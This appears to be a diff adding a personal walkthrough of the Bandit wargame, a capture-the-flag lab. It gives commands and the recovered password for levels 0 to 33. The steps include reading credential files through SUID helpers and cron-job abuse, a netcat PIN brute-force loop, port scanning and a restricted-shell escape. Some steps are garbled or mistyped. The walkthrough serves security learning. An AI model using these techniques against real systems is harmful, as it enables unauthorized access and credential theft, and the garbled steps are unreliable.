@@ -1,0 +1,381 @@
+level0 -> level1
+command : cat readme
+password for bandit1 : boJ9jbbUNNfktd78OOpsqOltutMc3MY1.
+
+level 1 -> level2
+command : cat ./-
+exp : clearly a dashed file
+password for bandit2 : CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+level2 -> level3
+command : cat 'spaces in this filename'
+
+password for bandit3 : UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+level3 -> level4
+command :  1. cd inhere
+                  2. ls -a
+                  3. cat .hidden
+password for bandit4 : pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+level4 -> level5
+write up :
+There are 9 files in the inhere directory so check all the files with this command. as we can see clearly this is a dashed file 
+
+command: cat ./file07 (cat ./file-no)
+
+password for bandit5 : koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+ 
+level5 -> level6 
+
+command : 1. find ./inhere -type f -readable ! -executable -size                      1033c 
+                 2. cat ./inhere/maybehere07/.file2
+
+password for bandit6 : DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+level6 - level7
+
+command : find / -user bandit7 -group bandit6 -size 33c
+
+password for bandit7 : HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+explanation : since we need to search the whole system we have to use find / insted of find ./
+
+level7 -> level8
+
+command : 1. ls
+                  2. cat data.txt | grep 'millionth'
+
+password for bandit8 : cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+level8 -> level9 
+
+command : cat data.txt | sort | uniq -u
+
+password for bandit9 : UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+level9 -> level10 
+
+command : strings data.txt | grep -E '='
+
+password for bandit10 : truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+
+level10 -> level11
+
+command :  cat data.txt | base64 -d
+
+password for bandit11 : IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+level11 -> level12
+
+command : cat data.txt
+
+EXPLANATION : you can just see the ontents of the file and according to the question given all the alphabets (lower or upper case) took a shift of 13 so clearly a case of ceaser cipher. so there are many ceaser cipher decoders online . 
+
+password for bandit12 : 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+level12 -> level13
+
+command :  1. xxd -r filename outputfile
+           2. cd /path/
+           3. cat filename
+           4. file filename
+           5. gzip -d filename.gz
+           6. bzip2 -d filename.bz2 
+           7. tar -xf filename.tar.gz
+           8. cat filename 
+
+password : 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+level13 -> level14
+
+command : 1. ls
+          2. ssh bandit14@localhost -i sshkey.private
+          3 cat /etc/bandit_pass/bandit14
+          
+explanation : here we are given a private key to get access to the level14 so since we are already in the bandit server we may not require any host because this is local host this private key givenis also called as identification file by secure shell.
+
+password : 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+level14 -> level15
+
+command : nc localhost 30000
+
+explantion : just conect ot the local host on port 30000 and enter the password for the current level to obtain the flag.
+
+password : BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+level 15 -> level16
+
+command : openssl s_client -connect localhost:30001
+
+explanation : use s_client option to connect to openssl;
+
+password : cluFn7wTiGryunymYOu4RcffSxQluehd
+
+level 16 -> level17
+
+command :  nmap -p 31000-32000
+           openssl s_client -connect localhost:portno 
+           
+explanation : here in the place of port no place the each open port we got in the nmap port scan.
+
+password : we get an private key in the port 31790
+
+then save the full private key with vim command in the directory /tmp/myname123 that we used in level12 and then use that to get access to level 17.
+
+level17 -> level18
+
+command to enter level 17 :
+ 1. chmod 400 bandit17.privatekey
+ 2.ssh bandit17@localhost -i bandit17.privatekey
+ 3. diff -c passwords.new passwords.old
+
+password :  kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+level18 -> level19
+
+command : ssh -t bandit18@localhost /bin/sh
+          cat readme
+          
+password 19 : IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+explanation : 
+
+level19 -> level 20 
+
+command : ./bandit20-do cat /etc/bandit_pass/bandit20
+
+password 20 :  GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+explanation : here we have an executable files with special permissions now we should run this first and check if the 
+it is a normal file. it is encrypted with suid . so here it says execute as another user . so 
+
+level20 -> level21
+
+command : first we have to start listening to any port : 35000
+          nc -l localhost -p 35000
+          then we have to open connect to the port using 
+          ./suconnect 35000 as mentioned if we use 
+          execute the ./suconnect command.
+          
+          
+password : gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr          
+
+level21 -> level22
+
+command :  1. cat cronjob_bandit22
+           2. cat /usr/bin/cronjob_bandit22.sh
+           3. cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+           4. flag here.
+           
+command :  Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+explanation : A program is running automatically at regular intervals from cron, the time-based job scheduler.this describes what a cron tab is.
+
+level22 -> level 23 
+
+command:  1. cat cronjob_bandit22
+          2. cat /usr/bin/cronjob_bandit23.sh
+          shell script result :
+          #!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+             3. myname=bandit23
+             4. echo I am user $myname | md5sum | cut -d '               ' ' -f 1
+             5. cat tmp/$mytarget/
+                        
+
+password for 23  : jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+level23 -> level 24 
+
+commands : #shell scripts introduced
+
+1. cd /etc/cron.d/
+
+2.ls
+result:
+ cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+
+3. cat cronjob_bandit24
+result : 
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+  1 !#/bin/bash
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+4. cat /usr/bin/cronjob_bandit24.sh 
+result :
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+if we understand this script it says it will excecute and delete all the scripts in /var/spool/bandit24 even if we dont have manuall permissions 
+to actually access a file 
+
+so writing a bash script will help 
+
+we are already given with the temp directory which we can use now.
+
+5. cd /tmp/sridhar5/
+
+6. vim script.sh
+shell script :
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/sridhar5/password
+
+result : 
+we are basically copying contents in this file to password file in our directory 
+
+7. chmod 777 script.sh
+8. touch password
+9. chmod 777 password
+10.cp script.sh /var/spool/bandit24/
+11 wait for the password to appear in password file in your dir
+
+password for bandit24 : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+level24 -> level25
+
+shell script for bruteforce:
+ #!/bin/bash
+
+  code1=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+ 
+  for pin in {0000..9999};do
+      echo "$code1 $pin"
+ done|nc localhost 30002
+
+password : uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+level25 -> 26 
+
+command : ssh -i bandit26.sshkey bandit26@localhost 
+          :e /etc/bandit_pass/bandit26
+          :set shell=/bin/bash
+          :shell
+
+password 26 : 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+level26 -> level 27
+
+command : ./bandit27-do 
+          ./bandit27-do cat /etc/bandit_pass/bandit27
+          
+password 27 : 3ba3118a22e93127a4ed485be72ef5ea
+
+level27 -> level28
+
+command : git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+        : 3ba3118a22e93127a4ed485be72ef5ea
+        :ls
+        :cat README
+
+password : 0ef186ac70e04ea33b4c1853d2526fa2
+
+level 28 -> level29
+
+command : git clone ssh://bandit28-git@localhost/home/bandit28-git/repo 
+        : 0ef186ac70e04ea33b4c1853d2526fa2
+        : ls
+        : cat README.md
+        : git log
+        : git diff de2ebe2d5fd1598cd547f4d56247e053be3fdc38 c086d11a00c0648d095d04c089786efef5e01264
+        
+explanation : here we have to watch the commit differences between two different commits.
+
+password : bbc96594b4e001778eee9975372716b2
+
+level29 -> level30 
+
+command : git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+        : git status
+        : git show-branch --all
+        : git checkout -b origin/dev
+        : git status
+        : ls
+        : cat README.md
+        
+password : 5b90576bedb2cc04c86a9e924ce42faf
+
+level30 -> level31 
+
+command : git tag 
+        : git show xxxx
+
+exp  : a tag is ususally a a reference point in the repositories history the main difference between tags and branches in git is (a tag is a branch that does not change ) like in a branch we can have any number of commits but in tags we only have 1 commit . 
+
+password : 47e603bb428404d265f59c42920d81e5
+
+level31 -> level32 
+
+the same process upto cloning the repo and reading the README.md file
+
+output : 
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+
+command : cd ..
+        :touch key.txt
+        :vim touch.txt press i to switch to insert mode
+        :May I come in?
+        :save it
+        :git add -f key.txt  -f because we want to overcome one of our .gitignore file	
+        : git commit --------and add a commit message 
+        : git push ----------and enter the localhost bandit31 password 
+        DONE ..xD!
+
+password : 56a9bf19c63d650ce78e6ec0354ee45e
+
+level 32 -> level33
+
+the shell given here is interactive shell changing from interactive to normal shell using
+ command : $0
+         :cat /etc/bandit_pass/bandit33 
+     
+ password : c9c3199ddf4121b10cf581a98d51caee
+    
+         
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
